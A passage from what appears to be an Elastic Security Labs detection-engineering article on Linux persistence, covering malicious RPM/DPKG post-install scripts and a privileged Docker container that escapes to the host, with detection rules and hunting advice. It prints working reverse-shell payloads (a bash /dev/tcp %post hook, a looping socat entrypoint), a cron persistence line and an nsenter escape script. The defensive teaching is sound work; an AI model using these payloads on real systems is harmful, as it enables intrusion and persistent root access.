mkdir -p %{buildroot}/usr/bin

%files
# No need to specify any files here since the payload is embedded

%post
# Trigger payload after installation
nohup setsid bash -c &#x27;bash -i &gt;&amp; /dev/tcp/${ip}/${port} 0&gt;&amp;1&#x27; &amp;

%clean
rm -rf %{buildroot}

%changelog
* $(date +&#x27;%a %b %d %Y&#x27;) John Doe &lt;john.doe@example.com&gt; 1.0-1
- Initial package creation</code></pre>
<p>Next, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">RPM</code> package is built using <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">rpmbuild</code>, and installed with <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">rpm</code>:</p>
<pre><code># Build RPM package
rpmbuild -bb ~/rpmbuild/SPECS/${PACKAGE_NAME}.spec

# Install RPM package with forced overwrite
VER=$(grep VERSION_ID /etc/os-release | cut -d &#x27;&quot;&#x27; -f 2 | cut -d &#x27;.&#x27; -f 1)
rpm -i --force ~/rpmbuild/RPMS/x86_64/${PACKAGE_NAME}-1.0-1.el${VER}.x86_64.rpm
mv ~/rpmbuild/RPMS/x86_64/${PACKAGE_NAME}-1.0-1.el${VER}.x86_64.rpm /var/lib/rpm/${PACKAGE_NAME}.rpm</code></pre>
<p>Upon installation, the payload will be executed. Again, the following <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Cron</code> job is created to ensure persistence on a one-minute interval:</p>
<p><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">echo &quot;*/1 * * * * rpm -i --force /var/lib/rpm/${PACKAGE_NAME}.rpm &gt; /dev/null 2&gt;&amp;1&quot; | crontab</code></p>
<p>Let’s examine the traces that the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">RPM</code> package technique leaves behind:</p>
<p></p>
<p>Upon PANIX execution, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">panix.spec</code> file is created and populated. Next, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">rpmbuild</code> is used to build the package, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">rpm -i</code> is executed to install the package. Upon installation, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">%post</code> payload is executed, leading to an execution of the reverse shell chain (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nohup</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">setsid</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">bash</code>) with a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">process.parent.command_line</code> of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/bin/sh /var/tmp/rpm-tmp.HjtRV5 1</code>, indicating the execution of an <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">RPM</code> package. After installation, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Crontab</code> is altered to execute the payload once, at one minute intervals for consistency.<br/>
<!-- -->Let’s take a look at the coverage:</p>
<p><em>Detection and endpoint rules that cover installer package (DPKG &amp; RPM) persistence</em></p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th align="left">Category</th><th align="left">Coverage</th></tr></thead><tbody><tr><td align="left">Process</td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_rpm_package_installation_from_unusual_parent.toml">RPM Package Installed by Unusual Parent Process</a> <a href="https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_dpkg_unusual_execution.toml">Unusual DPKG Execution</a> <a href="https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_dpkg_package_installation_from_unusual_parent.toml">DPKG Package Installed by Unusual Parent Process</a></td></tr><tr><td align="left">Network</td><td align="left"><a href="https://github.com/elastic/protections-artifacts/blob/065efe897b511e9df5116f9f96b6cbabb68bf1e4/behavior/rules/linux/persistence_egress_network_connection_from_default_dpkg_directory.toml">Egress Network Connection from Default DPKG Directory</a> <a href="https://github.com/elastic/protections-artifacts/blob/065efe897b511e9df5116f9f96b6cbabb68bf1e4/behavior/rules/linux/persistence_egress_network_connection_from_rpm_package.toml">Egress Network Connection from RPM Package</a></td></tr></tbody></table></div>
<p>You can revert the changes made by PANIX by running the following revert command:</p>
<pre><code>&gt; ./panix.sh --revert malicious-package

[+] Reverting malicious package...
[+] Removing DPKG package &#x27;panix&#x27;...
[+] DPKG package &#x27;panix&#x27; removed successfully.
[+] Removing cron job associated with &#x27;panix&#x27;...
[+] Cron job removed.
[+] Cleaning up &#x27;/var/lib/dpkg/info&#x27;...
[+] Cleanup completed.</code></pre>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="hunting-for-t1546016---installer-packages-dpkg--rpm" class="absolute -top-32"></span>Hunting for T1546.016 - Installer Packages: DPKG &amp; RPM</h3>
<p>We can hunt for this technique using ES|QL and OSQuery by focusing on suspicious activity tied to package management tools. The approach includes monitoring for the following:</p>
<ul>
<li><strong>File creation or modification in package management directories:</strong> Tracks unusual changes to files in paths like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/var/lib/dpkg/info/</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/var/lib/rpm/</code>, excluding common benign patterns such as checksum or list files.</li>
<li><strong>Processes executed from lifecycle scripts:</strong> Observes commands and processes launched from directories like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/var/tmp/rpm-tmp.*</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/var/lib/dpkg/info/</code>, which may indicate suspicious or unauthorized activity.</li>
<li><strong>Detailed metadata on modified files:</strong> Uses OSQuery to gather additional file metadata, including ownership and timestamps, for forensic analysis of package management activity.</li>
</ul>
<p>By combining the <a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_rpm_dpkg_installer_packages.md">Persistence via DPKG/RPM Package</a> hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to <a href="https://attack.mitre.org/techniques/T1546/016/">T1546.016</a>.</p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="t1610---deploy-container" class="absolute -top-32"></span>T1610 - Deploy Container</h1>
<p>Host escape involves exploiting vulnerabilities, misconfigurations, or excessive permissions in containerized or virtualized environments to gain access to the underlying host system. Technologies like Docker, Kubernetes, and VMware aim to isolate workloads, but improper configurations or shared resources can allow attackers to break out of the container and compromise the host. MITRE tracks container deployment under identifier <a href="https://attack.mitre.org/techniques/T1610/">T1610</a>.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="t1610---deploy-container-malicious-docker-container" class="absolute -top-32"></span>T1610 - Deploy Container: Malicious Docker Container</h2>
<p>Docker containers are particularly susceptible to host escapes when improperly secured. Attackers may exploit vulnerabilities or misconfigurations in two main ways:</p>
<p><strong>1. Manipulating a Running Container</strong></p>
<p>Attackers abuse misconfigured containers to execute commands affecting the host. Common scenarios include:</p>
<ul>
<li><strong>Privileged Mode</strong>: Containers running with <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">--privileged</code> can directly interact with host resources. For example, attackers may load kernel modules or access host-level devices.</li>
<li><strong>Excessive Capabilities</strong>: Containers with the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CAP_SYS_ADMIN</code> capability can perform privileged operations, such as mounting filesystems or accessing <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/dev</code> devices.</li>
<li><strong>Sensitive Volume Access</strong>: Volumes like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/var/run/docker.sock</code> allow attackers to issue Docker commands to the host.</li>
<li><strong>Host Namespace Access</strong>: Containers configured with <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">--pid=host</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">--net=host</code> expose the host&#x27;s process and network namespaces. Attackers can escalate privileges by targeting processes or manipulating network configurations directly.</li>
</ul>
<p><strong>2. Deploying a Malicious Container</strong></p>
<p>Attackers deploy custom containers designed to break out of isolation. These containers often include:</p>
<ul>
<li>Exploits targeting runtime vulnerabilities or kernel bugs.</li>
<li>Scripts for privilege escalation or persistence, such as reverse shells or C2 beacons.</li>
<li>Malicious configurations enabling unauthorized access to host resources.</li>
</ul>
<p>In the next section, we will take a look at an example of a malicious docker container implementation.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="persistence-through-t1610---deploy-container-malicious-docker-container" class="absolute -top-32"></span>Persistence through T1610 - Deploy Container: Malicious Docker Container</h3>
<p>In this scenario, we will take a look at how to simulate the creation of an exemplary malicious Docker container through PANIX. Within the <a href="https://github.com/Aegrah/PANIX/blob/ae404d5caf74c772436ccaaa0c3ab51cba8c4250/modules/setup_malicious_docker_container.sh">setup_malicious_docker_container.sh</a> module, PANIX creates a Dockerfile with the following contents:</p>
<pre><code>FROM alpine:latest

RUN apk add --no-cache bash socat sudo util-linux procps

RUN adduser -D lowprivuser

RUN echo &#x27;#!/bin/bash&#x27; &gt; /usr/local/bin/entrypoint.sh \\
	&amp;&amp; echo &#x27;while true; do /bin/bash -c &quot;socat exec:\&quot;/bin/bash\&quot;,pty,stderr,setsid,sigint,sane tcp:$ip:$port&quot;; sleep 60; done&#x27; &gt;&gt; /usr/local/bin/entrypoint.sh \\
	&amp;&amp; chmod +x /usr/local/bin/entrypoint.sh

RUN echo &#x27;#!/bin/bash&#x27; &gt; /usr/local/bin/escape.sh \\
	&amp;&amp; echo &#x27;sudo nsenter -t 1 -m -u -i -n -p -- su -&#x27; &gt;&gt; /usr/local/bin/escape.sh \\
	&amp;&amp; chmod +x /usr/local/bin/escape.sh \\
	&amp;&amp; echo &#x27;lowprivuser ALL=(ALL) NOPASSWD: /usr/bin/nsenter&#x27; &gt;&gt; /etc/sudoers

USER lowprivuser

ENTRYPOINT [&quot;/usr/local/bin/entrypoint.sh&quot;]</code></pre>
<p>The Dockerfile sets up a lightweight Alpine Linux container with tools like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">bash</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">socat</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nsenter</code>. The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">entrypoint.sh</code> script ensures continuous reverse shell access by repeatedly connecting to a remote server using <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">socat</code>. The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">escape.sh</code> script, which is granted passwordless <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sudo</code> permissions, uses <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nsenter</code> to attach to the host&#x27;s namespaces (e.g., mount, network, PID) via the init process, effectively breaking container isolation.</p>
<p>The container is built using:</p>
<p><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">docker build -t malicious-container -f $DOCKERFILE . &amp;&amp; \</code></p>
<p>Where the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">-t</code> flag tags the container for easy identification, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">-f</code> specifies the Dockerfile path.</p>
<p>It is then run with:</p>
<p><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">docker run -d --name malicious-container --privileged --pid=host malicious-container</code></p>
<p>Where the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">--privileged</code> flag allows full access to host resources, bypassing Docker’s isolation mechanisms, while <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">--pid=host</code> shares the host&#x27;s process namespace, enabling the container to interact directly with host-level processes.</p>
<p>To test this technique, Docker must be installed, and the user running the simulation must either have root or docker group permissions. Let’s run the payload and examine the logs through the execution of the following PANIX command:</p>
<pre><code>sudo ./panix.sh --malicious-container --ip 192.168.100.1 --port 2021

 =&gt; [1/5] FROM [installing ...]
 =&gt; [2/5] RUN apk add --no-cache bash socat sudo util-linux procps
 =&gt; [3/5] RUN adduser -D lowprivuser
 =&gt; [4/5] RUN echo &#x27;#!/bin/bash&#x27; &gt; /usr/local/bin/entrypoint.sh &amp;&amp; echo &#x27;while true; do /bin/bash -c &quot;socat exec:
 =&gt; [5/5] RUN echo &#x27;#!/bin/bash&#x27; &gt; /usr/local/bin/escape.sh &amp;&amp; echo &#x27;sudo nsenter -t 1 -m -u -i -n -p -- su -&#x27;

9543f7ce4c6a8defcad36358f00eb4d38a85a8688cc8ecd5f15a5a2d3f43383b

[+] Malicious Docker container created and running.
[+] Reverse shell is executed every minute.
[+] To escape the container with root privileges, run &#x27;/usr/local/bin/escape.sh&#x27;.
[+] Docker container persistence established!</code></pre>
<p>After catching the shell on the attacker’s machine, run the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/local/bin/escape.sh</code> script to escape the container:</p>
<pre><code>❯ nc -nvlp 2021
listening on [any] 2021 ...
connect to [192.168.211.131] from (UNKNOWN) [192.168.211.151] 44726

9543f7ce4c6a:/$ /usr/local/bin/escape.sh
root@debian10-persistence:~# hostname
debian10-persistence</code></pre>
<p>Upon execution, the following logs are generated:</p>
<p></p>
<p>The execution of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">panix.sh</code> initiates the creation of the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/tmp/Dockerfile</code>. The build command is then executed to create the container based on the specified configuration. Once built, the container is launched with the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">--privileged</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">--pid=host</code> flags, enabling the necessary capabilities for host escape. Upon startup, the container runs the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/local/bin/entrypoint.sh</code> script, which successfully establishes a reverse shell connection to the attacker’s machine using <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">socat</code>. After the shell is caught, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/local/bin/escape.sh</code> script is executed, effectively breaking out of the container and gaining access to the host.</p>
<p>Let’s take a look at the coverage:</p>
<p><em>Detection and endpoint rules that cover malicious Docker container persistence</em></p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th align="left">Category</th><th align="left">Coverage</th></tr></thead><tbody><tr><td align="left">Process</td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/execution_potentially_overly_permissive_container_creation.toml">Privileged Docker Container Creation</a> <a href="https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/privilege_escalation_docker_escape_via_nsenter.toml">Docker Escape via Nsenter</a> <a href="https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/privilege_escalation_docker_mount_chroot_container_escape.toml">Potential Chroot Container Escape via Mount</a> <a href="https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/privilege_escalation_container_util_misconfiguration.toml">Potential Privilege Escalation via Container Misconfiguration</a> <a href="https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/privilege_escalation_writable_docker_socket.toml">Potential Privilege Escalation through Writable Docker Socket</a></td></tr><tr><td align="left">Network</td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/execution_egress_connection_from_entrypoint_in_container.toml">Egress Connection from Entrypoint in Container</a></td></tr></tbody></table></div>
<p>Besides the rules mentioned above, we also have a dedicated set of container rules that leverages our <a href="https://www.elastic.co/guide/en/integrations/current/cloud_defend.html">Defend for Containers integration</a>, which can be found in the <a href="https://github.com/elastic/detection-rules/tree/main/rules/integrations/cloud_defend">cloud_defend</a> directory of our <a href="https://github.com/elastic/detection-rules">detection-rules repository</a>. We have also extended our protections through the integration of Falco with Elastic Security. This integration significantly enhances threat detection directly at the edge — whether in Docker containers, Kubernetes clusters, Linux virtual machines, or bare metal environments. By introducing dedicated Falco connectors, we&#x27;ve strengthened Elastic&#x27;s capabilities to improve cloud workload protection and endpoint security strategies.</p>
<p>For a deeper dive into how our Falco integration secures container workloads, check out our recent blog, <em>“<a href="https://www.elastic.co/blog/falco-elastic-security-cloud-workload-protection">Securing the Edge: Harnessing Falco’s Power with Elastic Security for Cloud Workload Protection</a>”</em>. The blog covers Falco setup, rule creation, alerting, and explores various threat scenarios.</p>
<p>You can revert the changes made by PANIX by running the following revert command:</p>
<pre><code>&gt; ./panix.sh --revert malicious-container

[+] Stopping and removing the &#x27;malicious-container&#x27;...
[+] Container &#x27;malicious-container&#x27; stopped and removed.
[+] Removing Docker image &#x27;malicious-container&#x27;...
[+] Docker image &#x27;malicious-container&#x27; removed.
[+] Removing Dockerfile at /tmp/Dockerfile...
[+] Dockerfile removed.</code></pre>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="hunting-for-t1610---deploy-container-malicious-docker-container" class="absolute -top-32"></span>Hunting for T1610 - Deploy Container: Malicious Docker Container</h3>
<p>We can hunt for this technique using ES|QL and OSQuery by focusing on suspicious container activity and configurations. The approach includes monitoring for the following:</p>
<ul>
<li><strong>Unusual network connections from Docker containers:</strong> Tracks connections to external or non-local IP addresses initiated by processes under <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/var/lib/docker/*</code>.</li>
<li><strong>Privileged Docker containers:</strong> Identifies containers running in privileged mode, which pose a higher risk of host compromise.</li>
<li><strong>Recently created containers and images:</strong> Observes Docker containers and images created or pulled within the last 7 days to detect unauthorized deployments or suspicious additions.</li>
<li><strong>Sensitive host directory mounts:</strong> Monitors container mounts accessing paths like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/var/run/docker.sock</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc</code>, or the root directory (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/</code>), which could enable container escape or unauthorized host access.</li>
</ul>
<p>By combining the <a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_malicious_docker_container.md">Persistence via Docker Container</a> hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to <a href="https://attack.mitre.org/techniques/T1610/">T1610</a>.</p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="conclusion" class="absolute -top-32"></span>Conclusion</h1>
<p>In this fourth chapter of the &quot;Linux Detection Engineering&quot; series, we examined additional persistence techniques that adversaries may leverage on Linux systems. We explored the abuse of PAM modules and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pam_exec</code> for executing malicious code during authentication events. After PAM, we looked into installer package manipulation via <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">RPM</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">DPKG</code>, where lifecycle scripts are weaponized for persistence during the package installation/updating process. We finalized this part by examining malicious Docker containers, detailing how privileged containers and host-level access can be exploited for persistence and container escape.</p>
<p>These techniques underscore the ingenuity and variety of methods adversaries can employ to persist on Linux systems. By leveraging <a href="https://github.com/Aegrah/PANIX">PANIX</a> to simulate these attacks and using the tailored ES|QL and OSQuery detection queries provided, you can build robust defenses and fine-tune your detection strategies.</p></div></div></div><div class="hidden lg:flex lg:col-span-1 text-sm lg:flex-col lg:space-y-6"><div class="toc"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Jump to section</h4><ul class="flex flex-col space-y-2"><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/approaching-the-summit-on-persistence#t1556003---pluggable-authentication-modules-malicious-pam"><span>T1556.003 -&nbsp; Pluggable Authentication Modules: Malicious&nbsp;PAM</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/approaching-the-summit-on-persistence#persistence-through-t1556003---pluggable-authentication-modules-malicious-pam"><span>Persistence through T1556.003 -&nbsp; Pluggable Authentication Modules: Malicious&nbsp;PAM</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/approaching-the-summit-on-persistence#hunting-for-t1556003---pluggable-authentication-modules-malicious-pam"><span>Hunting for T1556.003 -&nbsp; Pluggable Authentication Modules (Malicious&nbsp;PAM)</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/approaching-the-summit-on-persistence#t1556003---pluggable-authentication-modules-pam_execso"><span>T1556.003 -&nbsp; Pluggable Authentication Modules:&nbsp;pam\_exec.so</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/approaching-the-summit-on-persistence#persistence-through-t1556003---pluggable-authentication-modules-pam_execso"><span>Persistence through T1556.003 -&nbsp; Pluggable Authentication Modules:&nbsp;pam\_exec.so</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/approaching-the-summit-on-persistence#hunting-for-t1556003---pluggable-authentication-modules-pam_execso"><span>Hunting for T1556.003 -&nbsp; Pluggable Authentication Modules:&nbsp;pam\_exec.so</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/approaching-the-summit-on-persistence#t1546016---installer-packages-dpkg--rpm"><span>T1546.016 -&nbsp; Installer Packages: DPKG &&nbsp;RPM</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/approaching-the-summit-on-persistence#persistence-through-t1546016---installer-packages-dpkg--rpm"><span>Persistence through T1546.016 -&nbsp; Installer Packages: DPKG &&nbsp;RPM</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/approaching-the-summit-on-persistence#hunting-for-t1546016---installer-packages-dpkg--rpm"><span>Hunting for T1546.016 -&nbsp; Installer Packages: DPKG &&nbsp;RPM</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/approaching-the-summit-on-persistence#t1610---deploy-container-malicious-docker-container"><span>T1610 -&nbsp; Deploy Container: Malicious Docker&nbsp;Container</span></a></li></ul><button class="border-t border-white/20 w-full mt-3 py-2 flex items-center space-x-1 text-xs font-medium uppercase tracking-wide hover:text-white"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="w-3 h-3"><path d="M10.75 4.75a.75.75 0 00-1.5 0v4.5h-4.5a.75.75 0 000 1.5h4.5v4.5a.75.75 0 001.5 0v-4.5h4.5a.75.75 0 000-1.5h-4.5v-4.5z"></path></svg><span>Show more</span></button></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Elastic Security Labs Newsletter</h4><div><a target="_blank" class="button inline-flex" href="https://www.elastic.co/elastic-security-labs/newsletter?utm_source=security-labs">Sign Up</a></div></div></div></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl my-5 md:my-10 max-w-3xl mx-auto flex flex-col items-center shadow-2xl"><h4 class="font-bold leading-tight text-lg md:text-2xl">Share this article</h4><div class="flex flex-wrap items-center justify-center mt-4 space-x-4"><a class="flex items-center space-x-2 button" href="https://twitter.com/intent/tweet?text=Linux Detection Engineering - Approaching the Summit on Persistence Mechanisms&amp;url=https://www.elastic.co/security-labs/approaching-the-summit-on-persistence" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Twitter" title="Share this article on Twitter"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>Twitter</span></a><a class="flex items-center space-x-2 button" href="https://www.facebook.com/sharer/sharer.php?u=https://www.elastic.co/security-labs/approaching-the-summit-on-persistence" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Facebook" title="Share this article on Facebook"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M22.5 12c0-5.799-4.701-10.5-10.5-10.5S1.5 6.201 1.5 12c0 5.301 3.901 9.699 9 10.401V14.4h-2.7v-2.7h2.7v-2.1c0-2.7 1.8-4.2 4.2-4.2 1.2 0 2.1.1 2.4.2v2.4h-1.5c-1.2 0-1.5.6-1.5 1.5v1.8h3l-.3 2.7h-2.7V22C18.599 21.3 22.5 17.301 22.5 12z"></path></svg><span>Facebook</span></a><a class="flex items-center space-x-2 button" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.elastic.co/security-labs/approaching-the-summit-on-persistence&amp;title=Linux Detection Engineering - Approaching the Summit on Persistence Mechanisms" target="_blank" rel="noopener noreferrer" aria-label="Share this article on LinkedIn" title="Share this article on LinkedIn"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 